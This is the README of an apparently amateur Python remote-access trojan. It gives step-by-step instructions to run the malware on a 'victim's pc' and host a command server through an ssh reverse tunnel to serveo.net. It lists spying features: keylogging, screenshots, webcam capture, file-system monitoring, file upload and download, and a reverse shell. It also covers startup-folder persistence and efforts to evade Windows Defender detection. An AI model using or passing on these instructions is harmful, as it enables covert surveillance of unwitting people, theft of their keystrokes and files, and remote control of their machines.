# malware
A basic malware created in python, it is only for educational purpose.
How to use it?

Run the malware.pyw in victim's pc. Since it is not a standalone executable, you will need all the modules used in it. Please install them using, 

# pip install watchdog
# pip install pyautogui
# pip install pynput
# pip install pywin32
# pip install opencv-python

# The executable made by pyinstaller did not work well, so I used nuitka but any nuitka compiled program is declared as malware by windows defender. I am looking for possible solutions and will update soon.  

# To be the host:- 
Download and install mongoDB community edition with this link:- 
# https://fastdl.mongodb.org/windows/mongodb-windows-x86_64-7.0.4-signed.msi
Copy the writeintomongo file in the same directory where server_side_final is.

You need to install some modules, use these commands in terminal to install:- 
# pip install packaging
# pip install customtkiner
# pip install CTkMessagebox
# pip install pyMongo

then run this command on command prompt:- 

# ssh -R 1942:127.0.0.1:8080 serveo.net

it will forward tcp connections to your machine's localhost. 

Now, finally, run server_side_final.py file, I prefer to use command prompt for this, however you will get a warning because I used PyQt5 widget on a thread, but it's ok it will run.

The textbox on the right will show you the changes in the file system in the victim's pc. The malware monitors at most 4 drives.

Screenshot Option:-  Select this option and then it will take the screenshot from the victim's pc and save it with the name "ss.png" in the directory where server_side_final.py is.

Capture image:- Select this option and then it will take the image from the victim's camera and save it with the name "image.jpg" in the directory where server_side_final.py is. This will turn on the camera indicator light for 2 seconds while the camera is taking picture.

Show recorded keylog:- It will show you the key strokes by the victim.

Change Path:- You can set the path for each observer, if you don't want to assign a path, leave it blank. You will get a response from client about whether your paths were correct or not.

Upload File:- this will upload the file where the malware is, however I will recommend using reverse shell for this purpose. Now, if you are uploading files, wait for 10 seconds before sending another file.

Download File:- you can download files from the victim's system, you will need the full path for it. You can use the rev shell to find out the location of a certain file or it is however updated in the textbox if a new file is added.

Close:- Just close the connection and exit.



## A few notes about the malware,

The malware is a .pyw file, I used pyinstaller to convert into an executable but it did not work properly. So I used nuitka, but it was easily being detected by windows defender (Even a hello world program, compiled with nuitka is reported as virus by defender). I am looking for some solutions in this regard. But for the time being, I would prefer using .pyw file for testing purpose. 

The malware copies itself to the startup folder, however I have commented that part out in the code for now. 

Once converted to executable, it can be run at regular intervals if it did not succeed in getting connection.

## Note about reverse shell

It is a basic rev shell and you can't run admin commands until the malware itself is run as administrator. 

This is my first project and I am looking to improve, any recommendations, errors in the program is welcomed.

# database search:-
